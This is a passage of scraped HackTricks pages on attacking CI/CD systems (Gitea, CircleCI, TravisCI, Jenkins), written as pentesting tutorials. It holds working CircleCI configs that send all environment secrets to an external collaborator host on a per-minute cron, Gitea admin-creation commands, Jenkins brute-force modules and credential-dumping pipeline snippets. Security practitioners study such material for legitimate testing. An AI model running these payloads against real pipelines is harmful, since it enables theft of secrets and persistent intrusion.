check\nhttps://www.chainguard.dev/unchained/what-the-fork-imposter-commits-in-github-actions-and-ci-cd\n​\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nPentesting CI/CD -\nPrevious\nPentesting CI/CD Methodology\nNext\nAbusing Github Actions\nLast modified\n3mo ago"
    },
    {
        "title": "Gitea Security",
        "url": "https://cloud.hacktricks.xyz/pentesting-ci-cd/gitea-security",
        "text": "Gitea Security\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nWhat is Gitea\nGitea\nis a\nself-hosted community managed lightweight code hosting\nsolution written in Go.\nBasic Information\nBasic Gitea Information\nLab\nTo run a Gitea instance locally you can just run a docker container:\ndocker\nrun\n-p\n3000\n:3000 gitea/gitea\nConnect to port 3000 to access the web page.\nYou could also run it with kubernetes:\nhelm repo add gitea-charts https://dl.gitea.io/charts/\nhelm install gitea gitea-charts/gitea\nUnauthenticated Enumeration\nPublic repos:\nhttp://localhost:3000/explore/repos\n​\nRegistered users:\nhttp://localhost:3000/explore/users\n​\nRegistered Organizations:\nhttp://localhost:3000/explore/organizations\n​\nNote that by\ndefault Gitea allows new users to register\n. This won't give specially interesting access to the new users over other organizations/users repos, but a\nlogged in user\nmight be able to\nvisualize more repos or organizations\n.\nInternal Exploitation\nFor this scenario we are going to suppose that you have obtained some access to a github account.\nWith User Credentials/Web Cookie\nIf you somehow already have credentials for a user inside an organization (or you stole a session cookie) you can\njust login\nand check which which\npermissions you have\nover which\nrepos,\nin\nwhich teams\nyou are,\nlist other users\n, and\nhow are the repos protected.\nNote that\n2FA may be used\nso you will only be able to access this information if you can also\npass that check\n.\nNote that if you\nmanage to steal the\ni_like_gitea\ncookie\n(currently configured with SameSite: Lax) you can\ncompletely impersonate the user\nwithout needing credentials or 2FA.\nWith User SSH Key\nGitea allows\nusers\nto set\nSSH keys\nthat will be used as\nauthentication method to deploy code\non their behalf (no 2FA is applied).\nWith this key you can perform\nchanges in repositories where the user has some privileges\n, however you can not use it to access gitea api to enumerate the environment. However, you can\nenumerate local settings\nto get information about the repos and user you have access to:\n# Go to the the repository folder\n# Get repo config and current user name and email\ngit\nconfig\n--list\nIf the user has configured its username as his gitea username you can access the\npublic keys he has set\nin his account in\nhttps://github.com/<gitea_username>.keys\n, you could check this to confirm the private key you found can be used.\nSSH keys\ncan also be set in repositories as\ndeploy keys\n. Anyone with access to this key will be able to\nlaunch projects from a repository\n. Usually in a server with different deploy keys the local file\n~/.ssh/config\nwill give you info about key is related.\nGPG Keys\nAs explained\nhere\nsometimes it's needed to sign the commits or you might get discovered.\nCheck locally if the current user has any key with:\ngpg --list-secret-keys --keyid-format\n=\nlong\nWith User Token\nFor an introduction about\nUser Tokens check the basic information\n.\nA user token can be used\ninstead of a password\nto\nauthenticate\nagainst Gitea server\nvia API\n. it will has\ncomplete access\nover the user.\nWith Oauth Application\nFor an introduction about\nGitea Oauth Applications check the basic information\n.\nAn attacker might create a\nmalicious Oauth Application\nto access privileged data/actions of the users that accepts them probably as part of a phishing campaign.\nAs explained in the basic information, the application will have\nfull access over the user account\n.\nBranch Protection Bypass\nIn Github we have\ngithub actions\nwhich by default get a\ntoken with write access\nover the repo that can be used to\nbypass branch protections\n. In this case that\ndoesn't exist\n, so the bypasses are more limited. But lets take a look to what can be done:\nEnable Push\n: If anyone with write access can push to the branch, just push to it.\nWhitelist Restricted Pus\nh: The same way, if you are part of this list push to the branch.\nEnable Merge Whitelist\n: If there is a merge whitelist, you need to be inside of it\nRequire approvals is bigger than 0\n: Then... you need to compromise another user\nRestrict approvals to whitelisted\n: If only whitelisted users can approve... you need to compromise another user that is inside that list\nDismiss stale approvals\n: If approvals are not removed with new commits, you could hijack an already approved PR to inject your code and merge the PR.\nNote that\nif you are an org/repo admin\nyou can bypass the protections.\nEnumerate Webhooks\nWebhooks\nare able to\nsend specific gitea information to some places\n. You might be able to\nexploit that communication\n.\nHowever, usually a\nsecret\nyou can\nnot retrieve\nis set in the\nwebhook\nthat will\nprevent\nexternal users that know the URL of the webhook but not the secret to\nexploit that webhook\n.\nBut in some occasions, people instead of setting the\nsecret\nin its place, they\nset it in the URL\nas a parameter, so\nchecking the URLs\ncould allow you to\nfind secrets\nand other places you could exploit further.\nWebhooks can be set at\nrepo and at org level\n.\nPost Exploitation\nInside the server\nIf somehow you managed to get inside the server where gitea is running you should search for the gitea configuration file. By default it's located in\n/data/gitea/conf/app.ini\nIn this file you can find\nkeys\nand\npasswords\n.\nIn the gitea path (by default: /data/gitea) you can find also interesting information like:\nThe\nsqlite\nDB: If gitea is not using an external db it will use a sqlite db\nThe\nsessions\ninside the sessions folder: Running\ncat sessions/*/*/*\nyou can see the usernames of the logged users (gitea could also save the sessions inside the DB).\nThe\njwt private key\ninside the jwt folder\nMore\nsensitive information\ncould be found in this folder\nIf you are inside the server you can also\nuse the\ngitea\nbinary\nto access/modify information:\ngitea dump\nwill dump gitea and generate a .zip file\ngitea generate secret INTERNAL_TOKEN/JWT_SECRET/SECRET_KEY/LFS_JWT_SECRET\nwill generate a token of the indicated type (persistence)\ngitea admin user change-password --username admin --password newpassword\nChange the password\ngitea admin user create --username newuser --password superpassword --email\n[email protected]\n--admin --access-token\nCreate new admin user and get an access token\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nPrevious\nBasic Github Information\nNext\nBasic Gitea Information\nLast modified\n1yr ago"
    },
    {
        "title": "Concourse Security",
        "url": "https://cloud.hacktricks.xyz/pentesting-ci-cd/concourse-security",
        "text": "Concourse Security\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nBasic Information\nConcourse allows you to\nbuild pipelines\nto automatically run tests, actions and build images whenever you need it (time based, when something happens...)\nConcourse Architecture\nLearn how the concourse environment is structured in:\nConcourse Architecture\nConcourse Lab\nLearn how you can run a concourse environment locally to do your own tests in:\nConcourse Lab Creation\nEnumerate & Attack Concourse\nLearn how you can enumerate the concourse environment and abuse it in:\nConcourse Enumeration & Attacks\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nPrevious\nBasic Gitea Information\nNext\nConcourse Architecture\nLast modified\n1yr ago"
    },
    {
        "title": "CircleCI Security",
        "url": "https://cloud.hacktricks.xyz/pentesting-ci-cd/circleci-security",
        "text": "CircleCI Security\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nBasic Information\n​\nCircleCI\nis a Continuos Integration platform where you ca\ndefine templates\nindicating what you want it to do with some code and when to do it. This way you can\nautomate testing\nor\ndeployments\ndirectly\nfrom your repo master branch\nfor example.\nPermissions\nCircleCI\ninherits the permissions\nfrom github and bitbucket related to the\naccount\nthat logs in.\nIn my testing I checked that as long as you have\nwrite permissions over the repo in github\n, you are going to be able to\nmanage its project settings in CircleCI\n(set new ssh keys, get project api keys, create new branches with new CircleCI configs...).\nHowever, you need to be a a\nrepo admin\nin order to\nconvert the repo into a CircleCI project\n.\nEnv Variables & Secrets\nAccording to\nthe docs\nthere are different ways to\nload values in environment variables\ninside a workflow.\nBuilt-in env variables\nEvery container run by CircleCI will always have\nspecific env vars defined in the documentation\nlike\nCIRCLE_PR_USERNAME\n,\nCIRCLE_PROJECT_REPONAME\nor\nCIRCLE_USERNAME\n.\nClear text\nYou can declare them in clear text inside a\ncommand\n:\n-\nrun\n:\nname\n:\n\"set and echo\"\ncommand\n:\n|\nSECRET=\"A secret\"\necho $SECRET\nYou can declare them in clear text inside the\nrun environment\n:\n-\nrun\n:\nname\n:\n\"set and echo\"\ncommand\n:\necho $SECRET\nenvironment\n:\nSECRET\n:\nA secret\nYou can declare them in clear text inside the\nbuild-job environment\n:\njobs\n:\nbuild-job\n:\ndocker\n:\n-\nimage\n:\ncimg/base\n:\n2020.01\nenvironment\n:\nSECRET\n:\nA secret\nYou can declare them in clear text inside the\nenvironment of a container\n:\njobs\n:\nbuild-job\n:\ndocker\n:\n-\nimage\n:\ncimg/base\n:\n2020.01\nenvironment\n:\nSECRET\n:\nA secret\nProject Secrets\nThese are\nsecrets\nthat are only going to be\naccessible\nby the\nproject\n(by\nany branch\n).\nYou can see them\ndeclared in\nhttps://app.circleci.com/settings/project/github/<org_name>/<repo_name>/environment-variables\nThe \"\nImport Variables\n\" functionality allows to\nimport variables from other projects\nto this one.\nContext Secrets\nThese are secrets that are\norg wide\n. By\ndefault any repo\nis going to be able to\naccess any secret\nstored here:\nHowever, note that a different group (instead of All members) can be\nselected to only give access to the secrets to specific people\n.\nThis is currently one of the best ways to\nincrease the security of the secrets\n, to not allow everybody to access them but just some people.\nAttacks\nSearch Clear Text Secrets\nIf you have\naccess to the VCS\n(like github) check the file\n.circleci/config.yml\nof\neach repo on each branch\nand\nsearch\nfor potential\nclear text secrets\nstored in there.\nSecret Env Vars & Context enumeration\nChecking the code you can find\nall the secrets names\nthat are being\nused\nin each\n.circleci/config.yml\nfile. You can also get the\ncontext names\nfrom those files or check them in the web console:\nhttps://app.circleci.com/settings/organization/github/<org_name>/contexts\n.\nExfiltrate Project secrets\nIn order to\nexfiltrate ALL\nthe project and context\nSECRETS\nyou\njust\nneed to have\nWRITE\naccess to\njust 1 repo\nin the whole github org (\nand your account must have access to the contexts but by default everyone can access every context\n).\nThe \"\nImport Variables\n\" functionality allows to\nimport variables from other projects\nto this one. Therefore, an attacker could\nimport all the project variables from all the repos\nand then\nexfiltrate all of them together\n.\nAll the project secrets always are set in the env of the jobs, so just calling env and obfuscating it in base64 will exfiltrate the secrets in the\nworkflows web log console\n:\nversion\n:\n2.1\n​\njobs\n:\nexfil-env\n:\ndocker\n:\n-\nimage\n:\ncimg/base\n:\nstable\nsteps\n:\n-\ncheckout\n-\nrun\n:\nname\n:\n\"Exfil env\"\ncommand\n:\n\"env | base64\"\n​\nworkflows\n:\nexfil-env-workflow\n:\njobs\n:\n-\nexfil\n-\nenv\nIf you\ndon't have access to the web console\nbut you have\naccess to the repo\nand you know that CircleCI is used, you can just\ncreate a workflow\nthat is\ntriggered every minute\nand that\nexfils the secrets to an external address\n:\nversion\n:\n2.1\n​\njobs\n:\nexfil-env\n:\ndocker\n:\n-\nimage\n:\ncimg/base\n:\nstable\nsteps\n:\n-\ncheckout\n-\nrun\n:\nname\n:\n\"Exfil env\"\ncommand\n:\n\"curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`\"\n​\n# I filter by the repo branch where this config.yaml file is located: circleci-project-setup\nworkflows\n:\nexfil-env-workflow\n:\ntriggers\n:\n-\nschedule\n:\ncron\n:\n\"* * * * *\"\nfilters\n:\nbranches\n:\nonly\n:\n-\ncircleci\n-\nproject\n-\nsetup\njobs\n:\n-\nexfil\n-\nenv\nExfiltrate Context Secrets\nYou need to\nspecify the context name\n(this will also exfiltrate the project secrets):\nversion\n:\n2.1\n​\njobs\n:\nexfil-env\n:\ndocker\n:\n-\nimage\n:\ncimg/base\n:\nstable\nsteps\n:\n-\ncheckout\n-\nrun\n:\nname\n:\n\"Exfil env\"\ncommand\n:\n\"env | base64\"\n​\nworkflows\n:\nexfil-env-workflow\n:\njobs\n:\n-\nexfil-env\n:\ncontext\n:\nTest\n-\nContext\nIf you\ndon't have access to the web console\nbut you have\naccess to the repo\nand you know that CircleCI is used, you can just\nmodify a workflow\nthat is\ntriggered every minute\nand that\nexfils the secrets to an external address\n:\nversion\n:\n2.1\n​\njobs\n:\nexfil-env\n:\ndocker\n:\n-\nimage\n:\ncimg/base\n:\nstable\nsteps\n:\n-\ncheckout\n-\nrun\n:\nname\n:\n\"Exfil env\"\ncommand\n:\n\"curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`\"\n​\n# I filter by the repo branch where this config.yaml file is located: circleci-project-setup\nworkflows\n:\nexfil-env-workflow\n:\ntriggers\n:\n-\nschedule\n:\ncron\n:\n\"* * * * *\"\nfilters\n:\nbranches\n:\nonly\n:\n-\ncircleci\n-\nproject\n-\nsetup\njobs\n:\n-\nexfil-env\n:\ncontext\n:\nTest\n-\nContext\nJust creating a new\n.circleci/config.yml\nin a repo\nisn't enough to trigger a circleci build\n. You need to\nenable it as a project in the circleci console\n.\nEscape to Cloud\nCircleCI\ngives you the option to run\nyour builds in their machines or in your own\n.\nBy default their machines are located in GCP, and you initially won't be able to fid anything relevant. However, if a victim is running the tasks in\ntheir own machines (potentially, in a cloud env)\n, you might find a\ncloud metadata endpoint with interesting information on it\n.\nNotice that in the previous examples it was launched everything inside a docker container, but you can also\nask to launch a VM machine\n(which may have different cloud permissions):\njobs\n:\nexfil-env\n:\n#docker:\n#  - image: cimg/base:stable\nmachine\n:\nimage\n:\nubuntu\n-\n2004\n:\ncurrent\nOr even a docker container with access to a remote docker service:\njobs\n:\nexfil-env\n:\ndocker\n:\n-\nimage\n:\ncimg/base\n:\nstable\nsteps\n:\n-\ncheckout\n-\nsetup_remote_docker\n:\nversion\n:\n19.03.13\nPersistence\nIt's possible to\ncreate\nuser tokens in CircleCI\nto access the API endpoints with the users access.\nhttps://app.circleci.com/settings/user/tokens\nIt's possible to\ncreate projects tokens\nto access the project with the permissions given to the token.\nhttps://app.circleci.com/settings/project/github/<org>/<repo>/api\nIt's possible to\nadd SSH keys\nto the projects.\nhttps://app.circleci.com/settings/project/github/<org>/<repo>/ssh\nIt's possible to\ncreate a cron job in hidden branch\nin an unexpected project that is\nleaking\nall the\ncontext env\nvars everyday.\nOr even create in a branch / modify a known job that will\nleak\nall context and\nprojects secrets\neveryday.\nIf you are a github owner you can\nallow unverified orbs\nand configure one in a job as\nbackdoor\nYou can find a\ncommand injection vulnerability\nin some task and\ninject commands\nvia a\nsecret\nmodifying its value\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nPrevious\nConcourse Enumeration & Attacks\nNext\n- Pentesting CI/CD\nTravisCI Security\nLast modified\n1yr ago"
    },
    {
        "title": "TravisCI Security",
        "url": "https://cloud.hacktricks.xyz/pentesting-ci-cd/travisci-security",
        "text": "TravisCI Security\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nWhat is TravisCI\nTravis CI\nis a\nhosted\nor on\npremises\ncontinuous integration\nservice used to build and test software projects hosted on several\ndifferent git platform\n.\nBasic TravisCI Information\nAttacks\nTriggers\nTo launch an attack you first need to know how to trigger a build. By default TravisCI will\ntrigger a build on pushes and pull requests\n:\nCron Jobs\nIf you have access to the web application you can\nset crons to run the build\n, this could be useful for persistence or to trigger a build:\nIt looks like It's not possible to set crons inside the\n.travis.yml\naccording to\nthis\n.\nThird Party PR\nTravisCI by default disables sharing env variables with PRs coming from third parties, but someone might enable it and then you could create PRs to the repo and exfiltrate the secrets:\nDumping Secrets\nAs explained in the\nbasic information\npage, there are 2 types of secrets.\nEnvironment Variables secrets\n(which are listed in the web page) and\ncustom encrypted secrets\n, which are stored inside the\n.travis.yml\nfile as base64 (note that both as stored encrypted will end as env variables in the final machines).\nTo\nenumerate secrets\nconfigured as\nEnvironment Variables\ngo to the\nsettings\nof the\nproject\nand check the list. However, note that all the project env variables set here will appear when triggering a build.\nTo enumerate the\ncustom encrypted secrets\nthe best you can do is to\ncheck the\n.travis.yml\nfile\n.\nTo\nenumerate encrypted files\nyou can check for\n.enc\nfiles\nin the repo, for lines similar to\nopenssl aes-256-cbc -K $encrypted_355e94ba1091_key -iv $encrypted_355e94ba1091_iv -in super_secret.txt.enc -out super_secret.txt -d\nin the config file, or for\nencrypted iv and keys\nin the\nEnvironment Variables\nsuch as:\nTODO:\nExample build with reverse shell running on Windows/Mac/Linux\nExample build leaking the env base64 encoded in the logs\nTravisCI Enterprise\nIf an attacker ends in an environment which uses\nTravisCI enterprise\n(more info about what this is in the\nbasic information\n), he will be able to\ntrigger builds in the the Worker.\nThis means that an attacker will be able to move laterally to that server from which he could be able to:\nescape to the host?\ncompromise kubernetes?\ncompromise other machines running in the same network?\ncompromise new cloud credentials?\nReferences\n​\nhttps://docs.travis-ci.com/user/encrypting-files/\n​\n​\nhttps://docs.travis-ci.com/user/best-practices-security\n​\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nPentesting CI/CD -\nPrevious\nCircleCI Security\nNext\nBasic TravisCI Information\nLast modified\n1yr ago"
    },
    {
        "title": "Jenkins Security",
        "url": "https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security",
        "text": "Jenkins Security\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nBasic Information\nJenkins offers a simple way to set up a\ncontinuous integration\nor\ncontinuous delivery\n(CI/CD) environment for almost\nany\ncombination of\nlanguages\nand source code repositories using pipelines, as well as automating other routine development tasks. While Jenkins doesn’t eliminate the\nneed to create scripts for individual steps\n, it does give you a faster and more robust way to integrate your entire chain of build, test, and deployment tools than you can easily build yourself.\nDefinition from\nhere\n.\nBasic Jenkins Information\nUnauthenticated Enumeration\nIn order to search for interesting Jenkins pages without authentication like (\n/people\nor\n/asynchPeople\n, this lists the current users) you can use:\nmsf> use auxiliary/scanner/http/jenkins_enum\nCheck if you can execute commands without needing authentication:\nmsf> use auxiliary/scanner/http/jenkins_command\nWithout credentials you can look inside\n/asynchPeople/\npath or\n/securityRealm/user/admin/search/index?q=\nfor\nusernames\n.\nYou may be able to get the Jenkins version from the path\n/oops\nor\n/error\nKnown Vulnerabilities\nGitHub - gquere/pwn_jenkins: Notes about attacking Jenkins servers\nGitHub\nLogin\nIn the basic information you can check\nall the ways to login inside Jenkins\n:\nBasic Jenkins Information\nRegister\nYou will be able to find Jenkins instances that\nallow you to create an account and login inside of it. As simple as that.\nSSO Login\nAlso if\nSSO\nfunctionality\n/\nplugins\nwere present then you should attempt to\nlog-in\nto the application using a test account (i.e., a test\nGithub/Bitbucket account\n). Trick from\nhere\n.\nBruteforce\nJekins\ndoes\nnot\nimplement any\npassword policy\nor username\nbrute-force mitigation\n. Then, you\nshould\nalways try to\nbrute-force\nusers because probably\nweak passwords\nare being used (even\nusernames as passwords\nor\nreverse\nusernames as passwords).\nmsf> use auxiliary/scanner/http/jenkins_login\nPassword spraying\nUse\nthis python script\nor\nthis powershell script\n.\nIP Whitelisting Bypass\nMany orgs combines\nSaaS-based source control management (SCM) systems\n(like GitHub or GitLab) with an\ninternal\n, self-hosted\nCI\nsolution (e.g. Jenkins, TeamCity) allowing these CI systems to\nreceive webhook events from the SaaS source\ncontrol vendors, for the simple purpose of triggering pipeline jobs.\nTherefore, the orgs\nwhitelists\nthe\nIP\nranges of the\nSCM\nallowing them to reach the\ninternal\nCI system with\nwebhooks\n. However, note how\nanyone\ncan create an\naccount\nin Github or Gitlab and make it\ntrigger a webhook\nthat could send a request to that\ninternal CI system\n.\nSCM IP Whitelisting Bypass\nInternal Jenkins Abuses\nIn these scenarios we are going to suppose you have a valid account to access Jenkins.\nDepending on the\nAuthorization\nmechanism configured in Jenkins and the permission of the compromised user you\nmight be able or not to perform the following attacks.\nFor more information check the basic information:\nBasic Jenkins Information\nListing users\nIf you have accessed Jenkins you can list other registered users in\nhttp://127.0.0.1:8080/asynchPeople/\n​\nDumping builds to find cleartext secrets\nUse\nthis script\nto dump build console outputs and build environment variables to hopefully find cleartext secrets.\npython3 jenkins_dump_builds.py\n-u\nalice\n-p\nalice http://127.0.0.1:8080/\n-o\nbuild_dumps\ncd\nbuild_dumps\ngitleaks detect --no-git\n-v\nStealing SSH Credentials\nIf the compromised user has\nenough privileges to create/modify a new Jenkins node\nand SSH credentials are already stored to access other nodes, he could\nsteal those credentials\nby creating/modifying a node and\nsetting a host that will record the credentials\nwithout verifying the host key:\nYou will usually find Jenkins ssh credentials in a\nglobal provider\n(\n/credentials/\n), so you can also dump them as you would dump any other secret. More information in the\nDumping secrets section\n.\nRCE in Jenkins\nGetting a\nshell in the Jenkins server\ngives the attacker the opportunity to leak all the\nsecrets\nand\nenv variables\nand to\nexploit other machines\nlocated in the same network or even\ngather cloud credentials\n.\nBy default, Jenkins will\n“run as system” builds\n. In other words, they assign it to the\nall-powerful SYSTEM user\n, meaning any action executed during the build has permission to do whatever it wants.\nRCE Creating/Modifying a project\nCreating/Modifying a project is a way to obtain RCE over the Jenkins server:\nJenkins RCE Creating/Modifying Project\nRCE Execute Groovy script\nYou can also obtain RCE executing a Groovy script, which might my stealthier than creating a new project:\nJenkins RCE with Groovy Script\nRCE Creating/Modifying Pipeline\nYou can also get\nRCE by creating/modifying a pipeline\n:\nJenkins RCE Creating/Modifying Pipeline\nPipeline Exploitation\nTo exploit pipelines you still need to have access to Jenkins.\nBuild Pipelines\nPipelines\ncan also be used as\nbuild mechanism in projects\n, in that case it can be configured a\nfile inside the repository\nthat will contains the pipeline syntax. By default\n/Jenkinsfile\nis used:\nIt's also possible to\nstore pipeline configuration files in other places\n(in other repositories for example) with the goal of\nseparating\nthe repository\naccess\nand the pipeline access.\nIf an attacker have\nwrite access over that file\nhe will be able to\nmodify\nit and\npotentially trigger\nthe pipeline without even having access to Jenkins.\nIt's possible that the attacker will need to\nbypass some branch protections\n(depending on the platform and the user privileges they could be bypassed or not).\nThe most common triggers to execute a custom pipeline are:\nPull request\nto the main branch (or potentially to other branches)\nPush to the main branch\n(or potentially to other branches)\nUpdate the main branch\nand wait until it's executed somehow\nIf you are an\nexternal user\nyou shouldn't expect to create a\nPR to the main branch\nof the repo of\nother user/organization\nand\ntrigger the pipeline\n... but if it's\nbad configured\nyou could fully\ncompromise companies just by exploiting this\n.\nPipeline RCE\nIn the previous RCE section it was already indicated a technique to\nget RCE modifying a pipeline\n.\nChecking Env variables\nIt's possible to declare\nclear text env variables\nfor the whole pipeline or for specific stages. This env variables\nshouldn't contain sensitive info\n, but and attacker could always\ncheck all the pipeline\nconfigurations/Jenkinsfiles:\npipeline\n{\nagent\n{\nlabel\n'built-in'\n}\nenvironment\n{\nGENERIC_ENV_VAR\n=\n\"Test pipeline ENV variables.\"\n}\n​\nstages\n{\nstage\n(\n\"Build\"\n)\n{\nenvironment\n{\nSTAGE_ENV_VAR\n=\n\"Test stage ENV variables.\"\n}\nsteps\n{\nDumping secrets\nFor information about how are secrets usually treated by Jenkins check out the basic information:\nBasic Jenkins Information\nCredentials can be\nscoped to global providers\n(\n/credentials/\n) or to\nspecific projects\n(\n/job/<project-name>/configure\n). Therefore, in order to exfiltrate all of them you need to\ncompromise at least all the projects\nthat contains secrets and execute custom/poisoned pipelines.\nThere is another problem, in order to get a\nsecret inside the env\nof a pipeline you need to\nknow the name and type of the secret\n. For example, you try lo\nload\na\nusernamePassword\nsecret\nas a\nstring\nsecret\nyou will get this\nerror\n:\nERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected\nHere you have the way to load some common secret types:\nwithCredentials\n([\nusernamePassword\n(\ncredentialsId:\n'flag2'\n, usernameVariable:\n'USERNAME'\n, passwordVariable:\n'PASS'\n)])\n{\nsh\n''\n'\nenv\n#Search for USERNAME and PASS\n''\n'\n}\n​\nwithCredentials\n([\nstring\n(\ncredentialsId:\n'flag1'\n, variable:\n'SECRET'\n)])\n{\nsh\n''\n'\nenv\n#Search for SECRET\n''\n'\n}\n​\nwithCredentials\n([\nusernameColonPassword\n(\ncredentialsId:\n'mylogin'\n, variable:\n'USERPASS'\n)])\n{\nsh\n''\n'\nenv\n# Search for USERPASS\n''\n'\n}\n​\n# You can also load multiple env variables at once\nwithCredentials\n([\nusernamePassword\n(\ncredentialsId:\n'amazon'\n, usernameVariable:\n'USERNAME'\n, passwordVariable:\n'PASSWORD'\n)\n,\nstring\n(\ncredentialsId:\n'slack-url'\n,variable:\n'SLACK_URL'\n)\n,\n])\n{\nsh\n''\n'\nenv\n''\n'\n}\nAt the end of this page you can\nfind all the credential types\n:\nhttps://www.jenkins.io/doc/pipeline/steps/credentials-binding/\n​\nThe best way to\ndump all the secrets at once\nis by\ncompromising\nthe\nJenkins\nmachine (running a reverse shell in the\nbuilt-in node\nfor example) and then\nleaking\nthe\nmaster keys\nand the\nencrypted secrets\nand decrypting them offline.\nMore on how to do this in the\nNodes & Agents section\nand in the\nPost Exploitation section\n.\nTriggers\nFrom\nthe docs\n: The\ntriggers\ndirective defines the\nautomated ways in which the Pipeline should be re-triggered\n. For Pipelines which are integrated with a source such as GitHub or BitBucket,\ntriggers\nmay not be necessary as webhooks-based integration will likely already be present. The triggers currently available are\ncron\n,\npollSCM\nand\nupstream\n.\nCron example:\ntriggers\n{\ncron\n(\n'H */4 * * 1-5'\n)\n}\nCheck\nother examples in the docs\n.\nNodes & Agents\nA\nJenkins instance\nmight have\ndifferent agents running in different machines\n. From an attacker perspective, access to different machines means\ndifferent potential cloud credentials\nto steal or\ndifferent network access\nthat could be abuse to exploit other machines.\nFor more information check the basic information:\nBasic Jenkins Information\nYou can enumerate the\nconfigured nodes\nin\n/computer/\n, you will usually find the **\nBuilt-In Node\n** (which is the node running Jenkins) and potentially more:\nIt is\nspecially interesting to compromise the Built-In node\nbecause it contains sensitive Jenkins information.\nTo indicate you want to\nrun\nthe\npipeline\nin the\nbuilt-in Jenkins node\nyou can specify inside the pipeline the following 